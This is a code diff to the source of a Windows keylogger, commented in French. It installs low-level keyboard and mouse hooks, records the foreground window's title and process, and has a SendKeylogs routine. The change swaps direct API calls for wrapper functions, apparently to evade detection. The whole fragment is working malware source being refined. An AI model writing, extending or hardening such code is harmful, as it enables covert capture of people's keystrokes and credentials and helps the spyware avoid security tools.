@@ -76,7 +76,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
                 GetWindowText(foregroundApp, appName, sizeof(appName));
 
                 //On ouvre le processus de la fenêtre au plan
-                GetWindowThreadProcessId(foregroundApp, &processId);
+                MyGetWindowThreadProcessId(foregroundApp, &processId);
                 process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
 
                 //On recupère le chemin complet de l'executable du processus de la fenêtre au premier plan
@@ -326,7 +326,7 @@ VOID SendKeylogs()
 DWORD WINAPI ThreadKeylogger()
 {
     //Hooks sur le clavier et la souris pour le keylogger
-    if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
+    if (!MySetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !MySetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
         ExitThread(EXIT_FAILURE);
 
     MSG msg;
